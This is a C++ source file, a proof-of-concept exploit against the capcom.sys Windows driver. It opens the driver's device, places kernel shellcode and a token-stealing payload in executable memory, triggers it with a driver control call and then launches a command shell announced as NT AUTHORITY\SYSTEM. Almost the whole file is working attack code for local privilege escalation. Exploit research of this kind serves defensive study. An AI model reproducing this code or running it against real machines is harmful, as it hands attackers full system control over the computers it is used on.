// Exploit proof of concept for capcom.sys driver

#include <iostream>
#include <windows.h>
#include "shellcode.h"

#define DEVICE_NAME "\\\\.\\Htsysm72FB"
#define IOCTL 0xAA013044

void spawnShell()
{
    std::cout << "[+] Spawning NT AUTHORITY\\SYSTEM shell..." << std::endl;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));

    CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

}

void exploitDriver()
{

    unsigned char payload[62];
    getShellcode(payload);
    

    HANDLE DeviceHandle = CreateFileW(TEXT(DEVICE_NAME), (GENERIC_READ | GENERIC_WRITE), 0, NULL, OPEN_EXISTING, 0, NULL);

    if (DeviceHandle == INVALID_HANDLE_VALUE)
    {
        std::cout << "[-] Unable to create file handle." << std::endl;
        exit(1);
    }
    std::cout << "[+] Successfully created file handle : 0x" << DeviceHandle << std::endl;

    //Prep prologue of shellcode buffer
    unsigned char shellcode[] =
        "\x90"
        "\xE8\x00\x00\x00\x00"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

    std::cout << "[+] Allocating memory for ring0 shellcode payload..." << std::endl;
    LPVOID InBufferContents = VirtualAlloc(0, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


    if (!InBufferContents)
    {
        std::cout << "[-] Unable to allocate memory." << std::endl;
        exit(1);
    }


    char* p1 = static_cast<char*>(InBufferContents) + 8;
    char* p2 = static_cast<char*>(InBufferContents) + 16;
    char* p3 = static_cast<char*>(InBufferContents) + 77;

    memmove(p1, shellcode, sizeof(shellcode));
    memmove(InBufferContents, &p1, 0x8); 
    //Add token stealing payload 
    memmove(p2, payload, sizeof(payload));  
    //Add ret to end of payload
    memmove(p3, "\xc3", 0x1);


    std::cout << "[+] Shellcode placed at : 0x" << InBufferContents << std::endl;

    DWORD BytesReturned = 0;
    uint32_t OutBuffer = 0;

    int capcom = DeviceIoControl(DeviceHandle, IOCTL, InBufferContents, 0x8, &OutBuffer, 0x4, &BytesReturned, NULL);

    if (!capcom)
    {
        std::cout << "[-] Error communicating with driver!" << std::endl;
        exit(1);
    }
    std::cout << "[+] Got handle to driver." << std::endl;

 }

int main()
{
    std::cout << "===Capcom Driver Exploit===\n" << std::endl;
    exploitDriver();
    spawnShell();
    std::cout << "[!] Finished!" << std::endl;
    return 0;
}

